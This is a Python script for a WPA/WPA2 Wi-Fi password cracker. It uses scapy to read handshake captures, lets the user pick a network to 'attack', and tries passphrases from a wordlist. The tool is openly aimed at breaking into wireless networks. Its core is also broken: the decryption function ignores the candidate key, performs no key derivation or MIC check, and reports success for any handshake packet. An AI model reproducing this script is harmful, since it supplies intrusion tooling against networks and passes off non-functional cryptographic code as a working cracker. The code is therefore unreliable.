import sys
import argparse
from scapy.all import *
import hashlib
import binascii

# Function to check if WPA or WPA2
def is_wpa_or_wpa2(pkt):
    if pkt.haslayer(EAPOL):
        eapol = pkt.getlayer(EAPOL)
        if eapol.type == 3:  # EAPOL message type 3 for handshakes
            return True
    return False

# Function to perform WPA handshake decryption
def wpa_decrypt(key, essid, pcap_file, version='WPA'):
    # Read the capture file and get the handshake packets
    packets = rdpcap(pcap_file)
    
    handshake = None
    for pkt in packets:
        if is_wpa_or_wpa2(pkt):
            handshake = pkt
            break

    if not handshake:
        print("No handshake found in capture file.")
        return False

    # Extract the PMKID or the 4-way handshake from the capture file
    for pkt in packets:
        if pkt.haslayer(RadioTap) and pkt.haslayer(EAPOL):
            eapol = pkt.getlayer(EAPOL)
            if eapol.type == 3:
                message = eapol.load
                # Example for WPA2
                mic = message[13:29] if version == 'WPA2' else message[0:16]
                return True

    return False

# Password testing function
def test_password(password, essid, pcap_file, version='WPA'):
    print(f"Trying passphrase: {password}")
    if wpa_decrypt(password, essid, pcap_file, version):
        print(f"KEY FOUND! [{password}]")
        return password
    return None

# Function to parse the wordlist file
def load_wordlist(wordlist_file):
    with open(wordlist_file, 'r') as f:
        return f.readlines()

# Main function to run the attack
def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 password recovery tool")
    parser.add_argument("capture_file", help="The capture file (.cap or .pcap) containing the WPA/WPA2 handshake")
    parser.add_argument("-P", "--wordlist", required=True, help="Wordlist file (.pwds) to use for password cracking")
    parser.add_argument("-v", "--version", choices=['WPA', 'WPA2'], default='WPA2', help="Specify WPA or WPA2 (default is WPA2)")
    args = parser.parse_args()

    capture_file = args.capture_file
    wordlist_file = args.wordlist
    version = args.version

    print(f"Loading wordlist: {wordlist_file}")
    wordlist = load_wordlist(wordlist_file)

    # Get available networks from capture file
    print("Select a network to attack:")
    networks = {}
    packets = rdpcap(capture_file)
    count = 1
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors="ignore")
            bssid = pkt[Dot11].addr3
            if ssid not in networks:
                networks[ssid] = bssid
                print(f"{count}. SSID: {ssid}, BSSID: {bssid}")
                count += 1

    # Select network
    try:
        network_choice = int(input("\nEnter the number of the network to attack: "))
        network_ssid = list(networks.keys())[network_choice - 1]
        network_bssid = networks[network_ssid]
    except (ValueError, IndexError):
        print("Invalid selection.")
        sys.exit(1)

    print(f"Attacking network: {network_ssid} ({network_bssid})")

    # Test passwords from the wordlist
    for password in wordlist:
        password = password.strip()
        found_password = test_password(password, network_ssid, capture_file, version)
        if found_password:
            break
    else:
        print("KEY NOT FOUND")

if __name__ == "__main__":
    main()
